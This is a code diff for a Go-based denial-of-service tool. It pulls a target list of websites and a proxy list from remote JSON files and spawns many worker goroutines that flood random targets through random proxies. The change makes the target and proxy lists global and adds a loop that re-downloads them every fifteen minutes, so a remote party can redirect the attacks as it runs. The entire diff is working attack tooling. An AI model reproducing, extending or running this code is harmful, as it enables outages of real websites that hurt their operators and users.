@@ -28,6 +28,9 @@ var workers int
 var useProxy bool
 var onlyOk bool
 
+var sites SiteStruct
+var proxies ProxyStruct
+
 func getSites() SiteStruct {
 
 	url := "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"
@@ -146,7 +149,7 @@ func requestMe(target string, proxyUrl string, proxyAuth string) {
 	log.Printf("200 OK!")
 }
 
-func gogogo(sites SiteStruct, proxies ProxyStruct, ebus chan int, id int) {
+func gogogo(ebus chan int, id int) {
 	nSite := rand.Int() % len(sites)
 	nProxy := rand.Int() % len(proxies)
 
@@ -157,11 +160,22 @@ func gogogo(sites SiteStruct, proxies ProxyStruct, ebus chan int, id int) {
 
 }
 
-func spawner(sites SiteStruct, proxies ProxyStruct, ebus chan int) {
+func spawner(ebus chan int) {
 	for true {
 		id := <-ebus
-		go gogogo(sites, proxies, ebus, id)
+		go gogogo(ebus, id)
 	}
+}
+
+func configUpdater() {
+	for true {
+		time.Sleep(time.Minute * 15)
+		fmt.Println("CONFIG UPDATE")
+		sites = getSites()
+		proxies = getProxies()
+		fmt.Println("CONFIG UPDATED")
+	}
+
 }
 
 func main() {
@@ -175,15 +189,15 @@ func main() {
 
 	rand.Seed(time.Now().Unix())
 	eventbus := make(chan int)
-	sites := getSites()
-	proxies := getProxies()
-	for i := 0; i < workers/100; i++ {
+	sites = getSites()
+	proxies = getProxies()
+	for i := 0; i < workers/100+1; i++ {
 		fmt.Println("Spawning spawner", i)
-		go spawner(sites, proxies, eventbus)
+		go spawner(eventbus)
 	}
 	for i := 0; i < workers; i++ {
 		fmt.Println("Spawning worker", i)
-		go gogogo(sites, proxies, eventbus, i)
+		go gogogo(eventbus, i)
 	}
-	spawner(sites, proxies, eventbus)
+	configUpdater()
 }
